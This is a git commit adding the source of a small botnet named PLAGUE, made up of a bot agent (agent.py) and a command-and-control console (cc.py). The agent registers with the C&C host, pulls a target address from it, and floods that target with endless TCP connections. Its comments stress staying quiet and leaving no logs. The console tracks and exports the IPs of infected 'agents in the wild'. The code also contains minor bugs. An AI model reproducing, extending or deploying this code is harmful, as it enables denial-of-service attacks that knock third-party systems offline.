379b2d8addd17913ca8fe75880df52d5a1021205
rf-peixoto <rodrigo-f-p@hotmail.com>
2022-02-28 15:40:52 -0300

    Initial commit.

---
+++ agent.py
@@ -0,0 +1,71 @@
+# This is the node template for your network.
+import socket
+from os import system
+from requests import get
+from time import sleep
+
+class Node:
+    # Initialize object with the first C&C socket.
+    def __init__(self):
+        # C&C setup:
+        self.cc_ip = socket.gethostname() # Change this.
+        self.cc_port = 2022
+        # List of sockets:
+        self.connections = []
+        # Actual target setup:
+        self.target_ip = ""
+        self.target_port = 0
+
+    # Calm down and close connections:
+    def close_connections(self):
+        for connection in len(self.connections):
+            try:
+                self.connections[connection].close()
+            except Exception as error:
+                # You do not want to create logs, just ignore.
+                pass
+
+    # Tell C&C that this node are up or check for the C&C itself.
+    def ping_cc(self):
+        try:
+            # Ping with a disposable socket:
+            ping_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            ping_socket.connect((self.cc_ip, self.cc_port))
+            sleep(0.1)
+            ping_socket.close()
+            return 0
+        except:
+            return 1
+
+    # Check for new targets.
+    def update_target(self):
+        # Get file on CC with new data
+        try:
+            data = get("http://{0}/target".format(self.cc_ip)).decode().split(":")
+            self.target_ip = data[0]
+            self.target_port = int(data[1])
+        except Exception as error:
+            # Again, try to not make much noise.
+            sleep(0.1)
+            pass
+
+    def attack(self):
+        socket_id = 0
+        while True:
+            try:
+                self.connections.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
+                self.connections[socket_id].connect((self.target_ip, self.target_port))
+                socket_id += 1
+                # Do not overload node's host:
+                sleep(0.1)
+            except Exception as error:
+                # Failed? Try to update the target socket:
+                self.update_target()
+                # Keep failing? Try to not DDoS your CC server too:
+                sleep(1)
+
+if __name__ == "__main__":
+    node = Node()
+    node.ping_cc()
+    node.update_target()
+    node.attack()
---
+++ cc.py
@@ -0,0 +1,88 @@
+# ============================================ #
+# PLAGUE Command & Control Interface 1.0.0     #
+# ============================================ #
+import socket, sys
+from os import system
+import colorama
+from colorama import Style, Fore, Back
+## SETUP ##
+# Colors:
+colorama.init()
+print(Style.BRIGHT)
+# Variables:
+agents_pool = []         # Agents online.
+server_status = False    # True: server is UP / False: server is DOWN.
+
+## FUNCIONS ##
+def export_agents():
+    if len(agents_pool) > 0:
+        with open("agents.txt", "w") as fl:
+            for agent in agents_pool:
+                fl.write(agent + "\n")
+    else:
+        pass
+
+def see_status():
+    print_logo()
+    if server_status:
+        print(Fore.CYAN + "[*] " + Fore.RESET + Back.RESET + "Your server is " + Fore.GREEN + "UP" + Fore.RESET + ".")
+        print(Fore.CYAN + "[*] " + Fore.YELLOW + "{0} ".format(len(agents_pool)) + Fore.RESET + "agents in the wild." + Fore.RESET)
+    else:
+        print(Back.RESET + "Your server is " + Fore.RED + "DOWN" + Fore.RESET + ".")
+    show_options()
+
+def start_server():
+    print(Fore.RESET + "Starting server. Press " + Fore.YELLOW + "CTRL + C " + Fore.RESET + "to close.")
+    server_status = True
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((socket.gethostname(), 2022))
+    server_socket.listen()
+    try:
+        while True:
+            # Get responses:
+            agent, ip = server_socket.accept()
+            agents_pool.append(ip[0])
+            print_logo()
+            print(Fore.CYAN + "[*] " + Fore.RESET + Back.RESET + "Your server is " + Fore.GREEN + "UP" + Fore.RESET + ".")
+            print(Fore.CYAN + "[*] " + Fore.YELLOW + "{0} ".format(len(agents_pool)) + Fore.RESET + "agents in the wild." + Fore.RESET)
+    except KeyboardInterrupt:
+        print(Fore.RESET + "Closing server...")
+        server_status = False
+        print("Exporting active agents list...")
+        export_agents()
+        print_logo()
+        print(Fore.GREEN + "SUCCESS!" + Fore.RESET)
+        show_options()
+
+## INTERFACE ##
+def print_logo():
+    # Prepare screen:
+    system("clear")
+    print(Fore.CYAN + Back.RESET + Style.BRIGHT)
+    # Print logo:
+    print("__________.____       _____    ________ ____ ______________")
+    print("\______   \    |     /  _  \  /  _____/|    |   \_   _____/")
+    print(" |     ___/    |    /  /_\  \/   \  ___|    |   /|    __)_")
+    print(" |    |   |    |___/    |    \    \_\  \    |  / |        \ ")
+    print(" |____|   |_______ \____|__  /\______  /______/ /_______  /")
+    print("                  \/       \/        \/                 \/\n")
+
+def show_options():
+    print(Back.RESET + Fore.YELLOW + "\n[0] " + Fore.RESET  + "Start server")
+    print(Back.RESET + Fore.YELLOW + "[1] " + Fore.RESET  + "See status")
+    print(Back.RESET + Fore.YELLOW + "[2] " + Fore.RESET  + "Quit")
+    option = input(Back.RESET + Fore.YELLOW + ">>> " + Fore.RESET)
+    if option == "0":
+        start_server()
+    elif option == "1":
+        see_status()
+    elif option == "2":
+        print(Fore.RESET + Back.RESET + "Goodbye!" + Style.RESET_ALL)
+        sys.exit()
+    else:
+        print_logo()
+        print(Back.RED + Fore.WHITE + "Invalid option.")
+        show_options()
+
+print_logo()
+show_options()
